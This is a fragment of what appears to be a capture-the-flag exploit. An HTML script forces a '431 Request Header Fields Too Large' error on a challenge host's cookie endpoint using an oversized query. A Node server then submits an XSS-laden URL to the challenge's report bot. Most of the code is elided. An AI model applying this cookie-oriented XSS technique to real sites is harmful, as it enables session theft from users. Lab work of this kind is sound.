...
<body>
  <script>
    ...
    ifr.src = "http://disconnection:3000/cookie?" + "x".repeat(20000); // 431 (Request Header Fields Too Large)
...
app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  ...
  await sleep(3 * 1000);
  await reportUrl(`http://disconnection:3000/?xss=${encodeURIComponent(xss)}`);
